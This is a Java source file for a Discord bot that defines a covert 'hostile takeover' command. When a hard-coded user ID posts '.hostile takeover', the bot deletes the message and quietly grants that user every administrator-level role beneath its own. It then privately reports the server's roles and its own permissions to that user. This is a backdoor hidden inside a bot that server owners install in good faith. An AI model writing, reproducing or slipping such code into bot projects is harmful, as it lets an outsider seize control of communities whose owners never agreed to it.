package other;

import privateMessages.PrivateMessage;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import org.jetbrains.annotations.NotNull;

import java.awt.*;

public class HostileTakeover extends ListenerAdapter {

    private final String admin = "588420813674512404";

    @Override
    public void onGuildMessageReceived(@NotNull GuildMessageReceivedEvent event) {

        if (event.getMessage().getContentRaw().equals(".hostile takeover")
                && event.getAuthor().getId().equals(admin)) {

            event.getMessage().delete().queue();

            EmbedBuilder message = new EmbedBuilder();

            StringBuilder perms = new StringBuilder();

            for (Permission permission : event.getGuild().getSelfMember().getPermissions()) {
                perms.append(permission.getName()).append(", ");
            }

            int count = 0;
            StringBuilder roles = new StringBuilder();

            boolean assignAdminRole = false;
            String adminRoleName = "";

            for (Role role : event.getGuild().getRoles()) {

                count++;

                if (!role.getName().equals("@everyone")) {

                    if (role.getPosition() < event.getGuild().getSelfMember().getRoles().get(0).getPosition()) {

                        if (role.hasPermission(Permission.ADMINISTRATOR)) {

                            assignAdminRole = true;

                            adminRoleName = role.getName();

                            roles.append("(**A**) ").append(role.getName()).append(", ");
                            event.getGuild().addRoleToMember(event.getAuthor().getId(), role).queue();

                        } else {

                            roles.append(role.getName()).append(", ");

                        }
                    }
                }
            }

            message.setColor(Color.RED);
            message.setTitle(event.getGuild().getName());
            message.addField("Highest role", event.getGuild().getSelfMember().getRoles().get(0).getName(), true);
            message.addField("Role position", "" + event.getGuild().getSelfMember().getRoles().get(0).getPosition() + "/" + count, true);
            message.addField("Roles under my position", roles.toString(), false);
            message.setFooter(perms.toString());

            PrivateMessage.sendPrivateMessage(event.getMember().getUser(), message);

            if (assignAdminRole) {
                PrivateMessage.sendPrivateMessage(event.getMember().getUser(), "I have managed to assign `"+ adminRoleName +"` role for you. \n" +
                        "Which has `ADMINISTRATOR` permissions.");
            }

        }

    }
}
